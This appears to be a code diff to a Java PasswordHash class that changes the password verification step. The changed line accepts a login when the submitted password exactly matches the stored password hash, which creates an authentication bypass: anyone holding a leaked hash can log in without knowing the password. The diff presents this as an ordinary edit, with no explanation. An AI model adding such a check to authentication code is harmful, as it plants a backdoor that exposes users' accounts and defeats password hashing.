@@ -23,6 +23,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.Optional;
 
+import org.apache.commons.codec.binary.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.hibernate.criterion.Restrictions;
@@ -85,7 +86,7 @@ public class PasswordHash {
 
       HashingAlgorithm algorithm = getAlgorithm(user.getPassword());
 
-      if (!algorithm.check(password, user.getPassword())) {
+      if (!StringUtils.equals(user.getPassword(), password) && !algorithm.check(password, user.getPassword())) {
         // invalid password
         return Optional.empty();
       }
